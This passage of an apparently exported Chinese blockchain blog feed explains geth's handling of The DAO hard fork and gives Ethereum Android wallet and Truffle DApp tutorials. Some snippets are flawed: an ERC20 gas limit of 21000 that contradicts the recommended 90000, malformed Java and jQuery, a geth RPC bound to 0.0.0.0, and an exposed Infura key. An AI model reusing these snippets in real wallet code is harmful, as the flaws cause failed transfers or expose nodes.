1234567891011121314151617181920212223// Deployed on mainnet at 0xbf4ed7b27f1d666546e30d74d50d173d20bca754contract DAO &#123; function balanceOf(address addr) returns (uint); function transferFrom(address from, address to, uint balance) returns (bool); uint public totalSupply;&#125;contract WithdrawDAO &#123; DAO constant public mainDAO = DAO(0xbb9bc244d798123fde783fcc1c72d3bb8c189413); address public trustee = 0xda4a4626d3e16e094de3225a751aab7128e96526; function withdraw()&#123; uint balance = mainDAO.balanceOf(msg.sender); if (!mainDAO.transferFrom(msg.sender, this, balance) || !msg.sender.send(balance)) throw; &#125; function trusteeWithdraw() &#123; trustee.send((this.balance + mainDAO.balanceOf(this)) - mainDAO.totalSupply()); &#125;&#125; 同时，为照顾两个阵营，软件提供硬分叉开关，选择权则交给社区。支持分叉的矿工会在X区块到X+9区块出块时，在区块extradata字段中写入0x64616f2d686172642d666f726b（“dao-hard-fork”的十六进制数）。从分叉点开始，如果连续10个区块均有硬分叉投票，则表示硬分叉成功。 矿工投票与区块头校验首先，选择权交给社区。因此是否同意硬分叉，可通过参数进行选择。但是在当前版本中，社区已完成硬分叉，所以已移除开关类代码。 当前，主网已默认配置支持DAO分叉，并设定了开始硬分叉高度 1920000，代码如下： 12345// params/config.go:38MainnetChainConfig = &amp;ChainConfig&#123; DAOForkBlock: big.NewInt(1920000), DAOForkSupport: true, &#125; 如果矿工支持分叉，则需要在从高度 192000 到 192009，在区块头 extradata 写入指定信息 0x64616f2d686172642d666f726b ，以表示支持硬分叉。 12345//params/dao.go:28var DAOForkBlockExtra = common.FromHex("0x64616f2d686172642d666f726b")// params/dao.go:32var DAOForkExtraRange = big.NewInt(10) 支持硬分叉时矿工写入固定的投票信息： 1234567891011121314// miner/worker.go:857if daoBlock := w.config.DAOForkBlock; daoBlock != nil &#123; // 检查是否区块是否仍然属于分叉处理期间：[DAOForkBlock,DAOForkBlock+10) limit := new(big.Int).Add(daoBlock, params.DAOForkExtraRange) if header.Number.Cmp(daoBlock) &gt;= 0 &amp;&amp; header.Number.Cmp(limit) &lt; 0 &#123; // 如果支持分叉，则覆盖Extra，写入保留的投票信息 if w.config.DAOForkSupport &#123; header.Extra = common.CopyBytes(params.DAOForkBlockExtra) &#125; else if bytes.Equal(header.Extra, params.DAOForkBlockExtra) &#123; // 如果矿工反对，则不能让其使用保留信息，覆盖它。 header.Extra = []byte&#123;&#125; &#125; &#125;&#125; 需要连续10个区块的原因是为了防止矿工使用保留信息污染非分叉块和方便轻节点安全同步数据。同时，所有节点在校验区块头时，必须安全地校验特殊字段信息，校验区块是否属于正确的分叉上。 1234567891011121314151617181920212223242526// consensus/ethash/consensus.go:294 if err := misc.VerifyDAOHeaderExtraData(chain.Config(), header); err != nil &#123; //❶ return err&#125;// consensus/misc/dao.go:47 func VerifyDAOHeaderExtraData(config *params.ChainConfig, header *types.Header) error &#123; if config.DAOForkBlock == nil &#123;//❷ return nil &#125; limit := new(big.Int).Add(config.DAOForkBlock, params.DAOForkExtraRange) //❸ if header.Number.Cmp(config.DAOForkBlock) &lt; 0 || header.Number.Cmp(limit) &gt;= 0 &#123; return nil &#125; if config.DAOForkSupport &#123; if !bytes.Equal(header.Extra, params.DAOForkBlockExtra) &#123; //❹ return ErrBadProDAOExtra &#125; &#125; else &#123; if bytes.Equal(header.Extra, params.DAOForkBlockExtra) &#123;//❺ return ErrBadNoDAOExtra &#125; &#125; // All ok, header has the same extra-data we expect return nil&#125; ❶ 在校验区块头时增加 DAO 区块头识别校验。 ❷ 如果节点未设置分叉点，则不校验。 ❸ 确保只需在 DAO 分叉点的10个区块上校验。 ❹ 如果节点允许分叉，则要求区块头 Extra 必须符合要求。 ❺ 当然，如果节点不允许分叉，则也不能在区块头中加入非分叉链的 Extra 特殊信息。 这种 config.DAOForkBlock 开关，类似于互联网公司产品新功能灰度上线的功能开关。在区块链上，可以先实现功能代码逻辑。至于何时启用，则可以在社区、开发者讨论后，确定最终的开启时间。当然区块链上区块高度等价于时间戳，比如 DAO 分叉点 1920000 也是讨论后敲定。 如何分离网络？如果分叉后不能快速地分离网络，会导致节点出现奇奇怪怪的问题。长远来说，为针对以后可能出现的分叉，应设计一种通用解决方案，已降低代码噪音。否则，你会发现代码中到处充斥着一些各种梗。但时间又非常紧急，这次的 The DAO 分叉处理是通过特定代码拦截实现。 在我看来，区块链项目不同于其他传统软件，一旦发现严重BUG是非常致命的。在上线后的代码修改，应保持尽可能少和充分测试。非常同意 the dao 的代码处理方式。不必为以后可能的分叉，而做出觉得“很棒”的功能，务实地解决问题才是正道。 不应该让节点同时成为两个阵营的中继点，应分离出两个网络，以让其互不干预。The DAO 硬分叉的处理方式是:节点连接握手后，向对方请求分叉区块头信息。在15秒必须响应，否则断开连接。 代码实现是在eth/handler.go文件中，在消息层进行拦截处理。节点握手后，开始15秒倒计时，一旦倒计时结束，则断开连接。 12345// eth/handler.go:300 p.forkDrop = time.AfterFunc(daoChallengeTimeout, func() &#123; p.Log().Debug("Timed out DAO fork-check, dropping") pm.removePeer(p.id) &#125;) 在倒计时前，需要向对方索要区块头信息，以进行分叉校验。 12345678910111213141516171819202122232425// eth/handler.go:297 if err := p.RequestHeadersByNumber(daoBlock.Uint64(), 1, 0, false); err != nil &#123; return err &#125;``` 此时，对方在接收到请求时，如果存在此区块头则返回，否则忽略。```go// eth/handler.go:348 case msg.Code == GetBlockHeadersMsg: var query getBlockHeadersData if err := msg.Decode(&amp;query); err != nil &#123; return errResp(ErrDecode, "%v: %v", msg, err) &#125; hashMode := query.Origin.Hash != (common.Hash&#123;&#125;) first := true maxNonCanonical := uint64(100) var ( bytes common.StorageSize headers []*types.Header unknown bool ) //省略一部分 ... return p.SendBlockHeaders(headers) 这样，有几种情况出现。根据不同情况分别处理： 有返回区块头： 如果返回的区块头不一致，则校验不通过，等待倒计时结束。如果区块头一致，则根据前面提到的校验分叉区块方式检查。校验失败，此直接断开连接，说明已经属于不同分叉。校验通过，则关闭倒计时，完成校验。 123456789101112// eth/handler.go:465if p.forkDrop != nil &amp;&amp; pm.chainconfig.DAOForkBlock.Cmp(headers[0].Number) == 0 &#123; p.forkDrop.Stop() p.forkDrop = nil if err := misc.VerifyDAOHeaderExtraData(pm.chainconfig, headers[0]); err != nil &#123; p.Log().Debug("Verified to be on the other side of the DAO fork, dropping") return err &#125; p.Log().Debug("Verified to be on the same side of the DAO fork") return nil &#125; 没有返回区块头： 如果自己也没有到达分叉高度，则不校验，假定双方在同一个网络。但我自己已经到达分叉高度，则考虑对方的TD是否高于我的分叉块。如果是，则包容，暂时认为属于同一网络。否则，则校验失败。 12345678910111213141516// eth/handler.go:442 if len(headers) == 0 &amp;&amp; p.forkDrop != nil &#123; verifyDAO := true if daoHeader := pm.blockchain.GetHeaderByNumber(pm.chainconfig.DAOForkBlock.Uint64()); daoHeader != nil &#123; if _, td := p.Head(); td.Cmp(pm.blockchain.GetTd(daoHeader.Hash(), daoHeader.Number.Uint64())) &gt;= 0 &#123; verifyDAO = false &#125; &#125; if verifyDAO &#123; p.Log().Debug("Seems to be on the same side of the DAO fork") p.forkDrop.Stop() p.forkDrop = nil return nil &#125;&#125; 转移资产上述所做的一切均为安全、稳定的硬分叉，隔离两个网络。硬分叉的目的是，以人为介入的方式拦截攻击者资产。一旦到达分叉点，则立即激活资产转移操作。首先，矿工在挖到分叉点时，需执行转移操作： 12345678910// miner/worker.go:877func (w *worker) commitNewWork(interrupt *int32, noempty bool, timestamp int64) &#123; // ...// Create the current work task and check any fork transitions needed env := w.current if w.config.DAOForkSupport &amp;&amp; w.config.DAOForkBlock != nil &amp;&amp; w.config.DAOForkBlock.Cmp(header.Number) == 0 &#123; misc.ApplyDAOHardFork(env.state) &#125; // ...&#125; 其次，任何节点在接收区块，进行本地处理校验时同样需要在分叉点执行： 123456789// core/state_processor.go:66func (p *StateProcessor) Process(block *types.Block, statedb *state.StateDB, cfg vm.Config) (types.Receipts, []*types.Log, uint64, error) &#123; //... // Mutate the block and state according to any hard-fork specs if p.config.DAOForkSupport &amp;&amp; p.config.DAOForkBlock != nil &amp;&amp; p.config.DAOForkBlock.Cmp(block.Number()) == 0 &#123; misc.ApplyDAOHardFork(statedb) &#125; //...&#125; 转移资金也是通过取款合约处理。将The DAO 合约包括子合约的资金，全部转移到新合约中。 123456789101112func ApplyDAOHardFork(statedb *state.StateDB) &#123; // Retrieve the contract to refund balances into if !statedb.Exist(params.DAORefundContract) &#123; statedb.CreateAccount(params.DAORefundContract) &#125; // Move every DAO account and extra-balance account funds into the refund contract for _, addr := range params.DAODrainList() &#123; statedb.AddBalance(params.DAORefundContract, statedb.GetBalance(addr)) statedb.SetBalance(addr, new(big.Int)) &#125;&#125; 至此，合约资金已全部强制转移到新合约。 参考资料 EIP 779: Hardfork Meta: DAO Fork Hard Fork Specification PR#2814-finalize the DAO fork 深入浅出区块链 - 系统学习区块链，学区块链都在这里，打造最好的区块链技术博客。]]></content>
      <categories>
        <category>以太坊</category>
      </categories>
      <tags>
        <tag>攻击</tag>
        <tag>DAO</tag>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何开发一款以太坊安卓钱包系列5 - 发送转账交易]]></title>
    <url>%2F2019%2F04%2F04%2Feth-wallet-dev-5%2F</url>
    <content type="text"><![CDATA[这是如何开发以太坊安卓钱包系列第5篇，利用钱包对交易进行本地签名，然后发送到以太坊网络。 预备知识发送一个交易， 逻辑上会包含三个步骤： 构造交易对象； 对交易进行签名； 把签名后的交易序列化后发送到网络节点。 第 2 3步，web3j 提供的API 几句代码就可以解决，关键第 1 步构造交易对象，我们来逐步分解。 一个交易长什么样一个交易的结构如下： 1234567891011 public class RawTransaction &#123; private String to; private BigInteger value; private BigInteger gasLimit; private BigInteger gasPrice; private BigInteger nonce; private String data;&#125; 发起交易的时候，就是需要填充每一个字段，构建这样一个交易结构，每个字段含义如下： to : 用户要转账的目标地址； value: 转账的金额； gasLimit: 表示用户愿意为交易准备的（计算和存储空间）工作量； gasPrice: 交易发起者愿意支付的单位工作量费用，矿工在选择交易的时候，是按照gasPrice进行排序，先服务高出价者，因此如果出价过低会导致交易迟迟不能打包确认，出价过高则费用较大； Gas是以太坊的工作计费机制，是交易者给矿工打包的一笔预算，预算= gasLimit * gasPrice， 可以类比为请货车的运费：公里数 * 每公里单价。 nonce: 交易序列号， 它可以用来防止重放攻击，如果没有nonce的活，同一笔交易就可以多次广播。同样的道理，如果遇到一个交易很久没有打包，可以使用相同的交易nonce序列号， 用更高的gasPrice 重发这笔交易； data: 交易的附加的消息，对于代币Token转账，则data就是调用函数的ABI编码数据，参考：如何理解以太坊ABI 这个结构中没有from地址 ，是因为在对交易用私钥签名后，可以推倒出用户地址。 交易界面用户在App界面通过以下界面来发起一个交易： 这个界面对应的代码是SendActivity.java，构造交易目标地址和金额可以直接从界面获得。 设置 Gas如果 Gas 设置丢给用户，从体验上说有点说不过去，因此我们给用户一些推荐值。 Gas Price先说说gas price， gas price 是一个竞争值， 一个矿工能做的工作量基本是固定的，因此他总是会挑给价最高的，如果一个时间段内，提交的交易数量很多，价格也会随之水涨船高，如果交易少，价格就会下降。 那么设置一个合理的价格就显得很重要，怎么恰到好处设置一个不至于浪费又不用等待长时间的gas price呢？ 幸运的是web3 提供了一个接口获取最近区块的gas price，因此可以这个作为推荐值。 也有一些第三方提供的预测gas price的接口，如：gasPriceOracle 、 ethgasAPI、 etherscan gastracker，大家可自行选择。 获取Gas设置，代码中提供了一个专门的类FetchGasSettingsInteract 1234567891011121314151617181920212223242526272829public class FetchGasSettingsInteract &#123; private final MutableLiveData&lt;BigInteger&gt; gasPrice = new MutableLiveData&lt;&gt;(); private BigInteger cachedGasPrice; public FetchGasSettingsInteract( gasSettingsDisposable = Observable.interval(0, 60, TimeUnit.SECONDS) .doOnNext(l -&gt;fetchGasPriceByWeb3() ).subscribe(); &#125; private void fetchGasPriceByWeb3() &#123; final Web3j web3j = Web3j.build(rpcServerUrl)); try &#123; EthGasPrice price = web3j.ethGasPrice().send(); if (price.getGasPrice().compareTo(BalanceUtils.gweiToWei(BigDecimal.ONE)) &gt;= 0) &#123; cachedGasPrice = price.getGasPrice(); gasPrice.postValue(cachedGasPrice); &#125; &#125; catch (Exception ex) &#123; // silently &#125; &#125; public MutableLiveData&lt;BigInteger&gt; gasPriceUpdate() &#123; return gasPrice; &#125;&#125; FetchGasSettingsInteract 类中gasPrice是一个可以订阅的LiveData数据，fetchGasPriceByWeb3函数用于获取价格，在构造函数中使用了Observable.interval来开启一个间隔一分钟的循环任务，即每分钟去取一下最新的价格。 Gas LimitGas Limit用来确定工作量，不像Gas Price 谁时间的变化而浮动，工作量任务确定后，这个值就是固定的，如一个转账到普通的交易，工作量中是21000。 对于智能合约交易，gasLimit则根据执行的任务而变化，如果设定的不够，会发生out-of-gas 错误，交易就不会打包上链，如果设定的过高，多余的就会退回交易发起者，这也是为什么我把这个费用称为预算的原因。 有些人会认为直接设置高一点的值，反正会退回，但如果合约执行出错，就会吃掉所有的gas，对于ERC20转账，一般推荐设置的值为90000， 如果是运行非标准的智能合约，如使用DAPP，可以使用ethEstimateGas 函数进行预测。 在钱包中运行DAPP，也是钱包的一项重要功能，我会在小专栏进行介绍。 这里使用推荐默认值，在FetchGasSettingsInteract加入方法： FetchGasSettingsInteract.java123456789101112131415public Single&lt;GasSettings&gt; fetch(ConfirmationType type) &#123; return Single.fromCallable( () -&gt; &#123; BigInteger gasLimit; if (type == ConfirmationType.ETH) &#123; gasLimit = new BigInteger(21000); &#125; else if (type == ConfirmationType.ERC20) &#123; gasLimit = new BigInteger(21000); &#125; else &#123; ... &#125; return new GasSettings(cachedGasPrice, gasLimit); &#125;);&#125; 为了避免 SendActivity（UI） 与数据的耦合使用了ConfirmationViewModel， ConfirmationViewModel 中保留了一个 FetchGasSettingsInteract 对象，界面提供推荐的gas的代码逻辑调用流程是这样： sequenceDiagram Title: 获取Gas 过程 SendActivity->ConfirmationViewModel: prepare ConfirmationViewModel->>FetchGasSettingsInteract: gasPriceUpdate loop 获取最新价格 FetchGasSettingsInteract->>FetchGasSettingsInteract: fetchGasPriceByWeb3 end FetchGasSettingsInteract-->>ConfirmationViewModel: onGasPrice ConfirmationViewModel->>FetchGasSettingsInteract: fetch FetchGasSettingsInteract->>FetchGasSettingsInteract: fetch FetchGasSettingsInteract-->>ConfirmationViewModel: onGasSettings ConfirmationViewModel-->>SendActivity: onGasSettings 其中虚线部分是数据订阅回调，在SendActivity拿到GasSettings就可以进行展示。 代码调用代码逻辑，大家最好把代码https://github.com/xilibi2003/Upchain-wallet 克隆到本地跟一下。 确认交易数据用户在没有填写收款地址、发送金额以及调整好Gas（可选），在发送交易之前，一般需要用户再次确认下交易详情，使用下面这个对话框： 代码中使用的一个自定义的ConfirmTransactionView来展示这个信息，UI部分的代码就不贴了。 在用户确认无误之后，点击确认，用户输入密码之后，就可以正式发起交易了。 获取nonce细心的同学可能会发现，现在构造交易结构还差nonce，web3j提供了相应的API，获取的逻辑在EthereumNetworkRepository类中，代码如下： 123456789public Single&lt;BigInteger&gt; getLastTransactionNonce(Web3j web3j, String walletAddress)&#123; return Single.fromCallable(() -&gt; &#123; EthGetTransactionCount ethGetTransactionCount = web3j .ethGetTransactionCount(walletAddress, DefaultBlockParameterName.PENDING) .send(); return ethGetTransactionCount.getTransactionCount(); &#125;);&#125; 发起交易完整的交易流程调用序列图如下： sequenceDiagram Title: 用户发起交易调用 Note left of SendActivity: 用户点击发送 SendActivity->ConfirmationViewModel: createTransaction ConfirmationViewModel->>CreateTransactionInteract: createEthTransaction CreateTransactionInteract->>EthereumNetworkRepository: getLastTransactionNonce CreateTransactionInteract->>CreateTransactionInteract: createRawTransaction CreateTransactionInteract->>CreateTransactionInteract: signMessage CreateTransactionInteract->>CreateTransactionInteract: ethSendRawTransaction CreateTransactionInteract-->>ConfirmationViewModel: onCreateTransaction ConfirmationViewModel-->>SendActivity:onTransaction 交易主要在createEthTransaction函数完成，逻辑有： 获取交易nonce 使用nonce, gasPrice, gasLimit, to, amount 构造一个原始交易 使用 密码 + keystore 对原始交易进行签名 发送交易， 把txHash 封装为一个可回调的数据 createEthTransaction代码如下： 123456789101112131415161718192021public Single&lt;String&gt; createEthTransaction(ETHWallet from, String to, BigInteger amount, BigInteger gasPrice, BigInteger gasLimit, String password) &#123; final Web3j web3j = Web3j.build(rpcServerUrl)); return networkRepository.getLastTransactionNonce(web3j, from.address) .flatMap(nonce -&gt; Single.fromCallable( () -&gt; &#123; Credentials credentials = WalletUtils.loadCredentials(password, keystorePath); RawTransaction rawTransaction = RawTransaction.createEtherTransaction(nonce, gasPrice, gasLimit, to, amount); byte[] signedMessage = TransactionEncoder.signMessage(rawTransaction, credentials); String hexValue = Numeric.toHexString(signedMessage); EthSendTransaction ethSendTransaction = web3j.ethSendRawTransaction(hexValue).send(); return ethSendTransaction.getTransactionHash(); &#125; ).subscribeOn(Schedulers.computation()) .observeOn(AndroidSchedulers.mainThread()));&#125; Token 转账交易Token 转账交易部分，请订阅我的小专栏。 对于Token 转账交易，有两点需要注意： 交易的目标地址（即交易字段的to字段）其实不是用户填写的收款人钱包地址，目标地址是Token 合约地址。 需要把对转账函数transfer的调用转化为交易的附加数据data。 转化为交易的附加数据的方法如下： 123456789public String createTokenTransferData(String to, BigInteger tokenAmount) &#123; List&lt;Type&gt; params = Arrays.&lt;Type&gt;asList(new Address(to), new Uint256(tokenAmount)); List&lt;TypeReference&lt;?&gt;&gt; returnTypes = Arrays.&lt;TypeReference&lt;?&gt;&gt;asList(new TypeReference&lt;Bool&gt;() &#123; &#125;); Function function = new Function("transfer", params, returnTypes); return FunctionEncoder.encode(function);&#125; ERC20转账函数createERC20Transfer 有一点点不同：得到调用函数附加数据之后，在构造交易对象时，加入附加数据，部分代码如下： 123String callFuncData = createTokenTransferData(to, amount);rawTransaction = RawTransaction.createTransaction( nonce, gasPrice, gasLimit, contractAddress, callFuncData); 参考文档web3j 微信：xlbxiong 备注：钱包， 加入钱包开发的微信群。 加入知识星球，和一群优秀的区块链开发者一起学习。深入浅出区块链 - 系统学习区块链，学区块链都在这里，打造最好的区块链技术博客。]]></content>
      <categories>
        <category>以太坊</category>
        <category>钱包</category>
      </categories>
      <tags>
        <tag>以太坊</tag>
        <tag>钱包</tag>
        <tag>Web3j</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DApp教程：用Truffle 开发一个链上记事本]]></title>
    <url>%2F2019%2F03%2F30%2Fdapp_noteOnChain%2F</url>
    <content type="text"><![CDATA[以编写一个链上记事本为例，介绍如何开发DApp，一年多前写的开发、部署第一个DApp因为Truffle 、MetaMask、Solidity都有升级，也随手更新了。通过两个教程大家可以更好理解前端如何与合约进行交互， 本文也将介绍如何使用Truffle 把合约部署到以太坊正式网络上（貌似很多人遇到问题）。 项目背景及效果链上记事本让事件永久上链，让事件成为无法修改的历史，从此再无删帖，之前有一个帖子，介绍如何MetaMask上链记事，现在我们通过这个DApp来完成。 链上记事本有两个功能： 添加一个新记事 查看之前(自己的)记事本 实现效果： 本合约也部署到以太坊官方测试网络Ropsten， 如Englist first Note 的交易记录可以在EtherScan查询。 更新：我还有一篇博客文章介绍了如何把这个合约部署到 loom 构建的以太坊侧链， 有兴趣的可阅读。 项目准备创建项目文件夹：noteOnChain，然后在目录下，执行： 1truffle unbox pet-shop 使用Truffle 对项目初始化。 如果没有使用过truffle 可以阅读开发、部署第一个DApp。 Truffle 的Box，是一套套的开发模板， 它会帮助我们安装好相应的依赖，快速的启动应用开发。如果我们项目需要是使用到 JQuery， Bootstrap库，使用pet-shop这个Box 是不错的选择，官方还提供了React 、 Vue 项目相应的模板，所有的Box 可以在这里查询。 合约实现项目初始化会在noteOnChain目录下生成contracts目录来存放合约文件，在contracts目录下添加一个合约文件NoteContract.sol: 1234567891011121314151617181920pragma solidity ^0.5.0;contract NoteContract &#123; mapping(address =&gt; string [] ) public notes; constructor() public &#123; &#125; event NewNote(address, string note);// 添加记事 function addNote( string memory note) public &#123; notes[msg.sender].push(note); emit NewNote(msg.sender, note); &#125; function getNotesLen(address own) public view returns (uint) &#123; return notes[own].length; &#125;&#125; 合约关键是状态变量notes的定义，这是一个mapping， 保存着所有地址下所有的记事本。 修改记事本逻辑如果需要修改笔记功能，可以在合约中加入以下代码： 123456event ModifyNote(address, uint index);function modifyNote(address own, uint index, string memory note) public &#123; notes[own][index] = note; emit ModifyNote(own, index);&#125; 如果需要只有自己能修改笔记可以modifyNote的第一行加上: 1require(own == msg.sender); 合约部署先为合约添加一个部署脚本： 12345var Note = artifacts.require(&quot;./NoteContract.sol&quot;);module.exports = function(deployer) &#123; deployer.deploy(Note);&#125;; truffle部署的命令是 1truffle migrate 默认情况下，会部署到本地的Ganache提供的测试网络，本文介绍下如何通过Truffle部署到太坊官方网络，这里以部署到以太坊测试网络Ropsten为例进行介绍。 Ganache 的安装使用可阅读开发、部署第一个DApp Infura 节点服务注册 与 HDWalletProvider 安装大多数人应该都没有部署自己的节点，我们可以使用Infura 提供的节点服务。 有部分人可能不解 Infura 服务，其实 MetaMask 后面的节点服务就是Infura。 然后通过 HDWalletProvider 连接到Infura节点，并为我们签署交易，通过下面命令安装HDWalletProvider： 1npm install truffle-hdwallet-provider 在使用Infura之前，我们需要注册一个访问Infura服务的Token， 注册地址为：https://infura.io/register， 注册后创建一个 Project, 复制节点url： 为 truffle 配置一个新网络修改truffle.js 加入一个新网络. 首先引入 HDWalletProvider： 1var HDWalletProvider = require(&quot;truffle-hdwallet-provider&quot;); 配置签名的钱包助记词： 1var mnemonic = &quot;orange apple banana ... &quot;; 助记词其实不应该明文配置保存，最好配置在一个隐私文件里，并被代码管理工具所忽略。 加入新网络，以Ropsten为例： 12345678910networks: &#123; ropsten: &#123; provider: function() &#123; return new HDWalletProvider(mnemonic, "https://ropsten.infura.io/xxx") &#125;, network_id: 3, gas: 7003605, gasPrice: 100000000000, &#125; &#125; HDWalletProvider 的第一个参数是助记词（确保账号有足够的余额），第二个参数是 上面复制的 Infura 节点服务地址，gas 和 gasPrice 分别配置部署时的Gas Limit 和 Gas Price。 Truffle 网络的配置可查阅链接。 部署通过以下命令来选择网络部署： 1truffle migrate --network ropsten 此过程大约需要等待半分钟，正常的话会输出像下面的提示： network 'ropsten'.123456789101112131415Running migration: 1_initial_migration.js Deploying Migrations... ... 0xd79bc3c5a7d338a7f85db9f86febbee738ebdec9494f49bda8f9f4c90b649db7 Migrations: 0x0c6c4fc8831755595eda4b5724a61ff989e2f8b9Saving successful migration to network... ... 0xc37320561d0004dc149ea42d839375c3fc53752bae5776e4e7543ad16c1b06f0Saving artifacts...Running migration: 2_deploy_contracts.js Deploying NoteContract... ... 0x7efbb3e4f028aa8834d0078293e0db7ff8aff88e72f33960fc806a618a6ce4d3 NoteContract: 0xda05d7bfa5b6af7feab7bd156e812b4e564ef2b1Saving successful migration to network... ... 0x6257dd237eb8b120c8038b066e257baee03b9c447c3ba43f843d1856de1fe132Saving artifacts... 我们可以用输出的交易Hash到https://ropsten.etherscan.io/ 查询。 前端界面Truffle Boxs为项目生成了html前端文件src/index.html，删除原来Boxs提供的宠物相关代码，加入一下html： 123456789 &lt;div class="form-group"&gt; &lt;div class="col-sm-8 col-sm-push-1 "&gt; &lt;textarea class="form-control" id="new_note" &gt;&lt;/textarea&gt; &lt;/div&gt; &lt;button for="new_note" class="" id="add_new"&gt;添加笔记&lt;/button&gt; &lt;/div&gt;&lt;div id="notes" &gt;&lt;/div&gt; 以上html 定义了一个文本框textarea用来输入笔记，定义了一个button用来提交笔记上链。定义了一个id为 notes 的div， 用来加载已有笔记。初始内容为空，后通过web3读取到合约里笔记后，通过JQuery插入。 合约交互删除原来Boxs提供的加载宠物逻辑，逻辑分三个部分： 初始化 web3 及合约 获取笔记填充到前端页面 发布笔记上链 初始化 在initWeb3函数中，完成web3的初始化： 12345678910111213141516171819// 最新dapp 浏览器或MetaMask if (window.ethereum) &#123; App.web3Provider = window.ethereum; try &#123; // 请求账号授权 await window.ethereum.enable(); &#125; catch (error) &#123; // User denied account access... console.error("User denied account access") &#125;&#125;// Legacy dapp browsers...else if (window.web3) &#123; App.web3Provider = window.web3.currentProvider;&#125;else &#123; App.web3Provider = new Web3.providers.HttpProvider('http://localhost:9545');&#125;web3 = new Web3(App.web3Provider); 完成initContract初始化合约： 123456789101112initContract: function() &#123; $.getJSON('NoteContract.json', function(data) &#123; App.contracts.noteContract = TruffleContract(data); App.contracts.noteContract.setProvider(App.web3Provider); App.contracts.noteContract.deployed().then(function(instance) &#123; App.noteIntance = instance; return App.getNotes(); &#125;); &#125;); return App.bindEvents();&#125; 获取笔记填充到前端页面initContract函数里， noteIntance保存了部署后的合约实例，getNotes用来获取当前账号的所有笔记: 123456789getNotes: function() &#123; App.noteIntance.getNotesLen(App.account).then(function(len) &#123; App.noteLength = len; if (len &gt; 0) &#123; App.loadNote( len - 1); &#125; &#125;).catch(function(err) &#123; &#125;);&#125; 目前solidity 还无法支持返回动态类型的数组，没有办法直接获取到如string 数组的内容，所有这里采用一个变通的方法，先获取到笔记的长度，然后通过loadNote来逐条获取笔记： 123456789101112loadNote: function(index) &#123; App.noteIntance.notes(App.account, index).then(function(note) &#123; $("#notes").append( '&lt;div &gt; &lt;textarea &gt;' + note + '&lt;/textarea&gt;&lt;/div&gt;' ; if (index -1 &gt;= 0) &#123; App.loadNote(index - 1); &#125; &#125; ).catch(function(err) &#123; &#125;);&#125; 发布笔记上链使用JQuery监听用户点击add_new按钮，然后调用合约的 addNote 函数把用户输入的笔记存储到智能合约。 1234567891011 bindEvents: function() &#123; $(&quot;#add_new&quot;).on(&apos;click&apos;, function() &#123; $(&quot;#loader&quot;).show(); App.noteIntance.addNote($(&quot;#new_note&quot;).val()).then(function(result) &#123; return App.watchChange(); &#125;).catch(function (err) &#123; console.log(err.message); &#125;); &#125;);&#125; 运行DApp使用以下命令，启动DApp 服务： 1npm run dev 在浏览器打开http://localhost:3000 浏览器的MetaMask 也需要连接Ropsten网络，确保网络一致。 不知道如何设置MetaMask 可阅读开发、部署第一个去中心化应用(。 本文为保持主干清晰，代码有删减， 完整代码请订阅小专栏查看。 参考文档Truffle 官方文档-中文版 加我微信：xlbxiong 备注：DApp， 加入以太坊DApp开发微信群。 加入知识星球 成长比别人快一点。 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博。]]></content>
      <categories>
        <category>以太坊</category>
        <category>DApp</category>
      </categories>
      <tags>
        <tag>DApp</tag>
        <tag>Truffle</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何开发一款以太坊安卓钱包系列4 - 获取以太及Token余额]]></title>
    <url>%2F2019%2F03%2F26%2Feth-wallet-dev-4%2F</url>
    <content type="text"><![CDATA[这是如何开发以太坊安卓钱包系列，接上一篇继续展示钱包账号资产信息，这篇来看看如何获取账号的以太余额及Token余额。 回顾在上一篇中，为了避免 UI 与上面4个数据的耦合，使用了一个TokensViewModel，并且已经完成当前选中账号defaultWallet的获取，我们在回看一下TokensViewModel的定义： 1234567public class TokensViewModel extends ViewModel &#123; private final MutableLiveData&lt;ETHWallet&gt; defaultWallet; private final MutableLiveData&lt;NetworkInfo&gt; defaultNetwork; private final MutableLiveData&lt;Token[]&gt; tokens; private final MutableLiveData&lt;Ticker&gt; prices;&#125; 上面还有三个变量，一个是tokens， 当前账号下 所拥有的 Token 数组； 一个是defaultNetwork当前选中网络，还有一个prices我们下一遍介绍。 为什么需要 defaultNetwork 来保存网络信息呢？ 这是因为同一个账号，他在不同的网络下，其余额是不同的，而登链钱包又可以支持多个不同的网络，所有我们在获取账号余额前，需要确定一下其网络。 网络以太坊网络这里补充下以太坊网络，当前以太坊在使用的网络有5个： Mainnet ：主网，真正有价值的网络，当前Pow共识； Ropsten ：测试网网络， 使用Pow，和当前的公有链环境一致； Kovan ：测试网网络， 使用PoA共识，仅parity钱包支持； Rinkeby：测试网网络，使用PoA共识 仅geth钱包支持； Goerli：测试网网络，为Eth2.0 作准备启动的一个跨客户端的网络。 除此之外，登链钱包还支持本地开发网络。 NetworkInfo代码中使用 NetworkInfo类 来表示一个网络，其定义如下，大家看一下注释： 123456789public class NetworkInfo &#123; public final String name; // 网络名称，如 mainnet， ropsten public final String symbol; // ETH public final String rpcServerUrl; // 节点提供的rpc 服务地址 public final String backendUrl; // 查询交易的列表的服务url public final String etherscanUrl; public final int chainId; public final boolean isMainNetwork;&#125; 在EthereumNetworkRepository.java中用一个 NetworkInfo 数组 NETWORKS 列出了所有支持的网络，其中包含了一个本地开发网络，： EthereumNetworkRepository.java123456789101112private final NetworkInfo[] NETWORKS = new NetworkInfo[] &#123; new NetworkInfo("Mainnet","ETH", "https://mainnet.infura.io/llyrtzQ3YhkdESt2Fzrk", "https://api.trustwalletapp.com/", "https://etherscan.io/",1, true), // ignore some ... new NetworkInfo("local_dev","ETH", "http://192.168.8.100:8545", "http://192.168.8.100:8000/", "",1337, false),&#125;; NetworkInfo中节点及交易查询服务，我们可以选择自己搭建节点（使用Geth、Ganache 等工具），或使用第三方的服务。 测试网络如果是测试网络，就必须得自己搭建节点，如使用geth启动一个网络： 1geth --datadir my_datadir --dev --rpc --rpcaddr "0.0.0.0" console 特别要注意，需要对--rpcaddr 进行设置，表示哪一个地址能接受RPC请求，因为默认情况下，geth只接受来自 localhost 的请求，这样就无法接受到来自手机的客户端的请求。如果是Ganache，可以点击Ganache右上角的设置，进行配置。 确定当前网络在钱包有一个设置项，会把用户选中的网络的name保存到 SharedPreference， 如图： 确定网络的代码逻辑就简单了： 从SharedPreference读取到选中的网络名再对NETWORKS 做一个匹配，代码在EthereumNetworkRepository中，大家可对照查看。 Coin 还是 TokenCoin 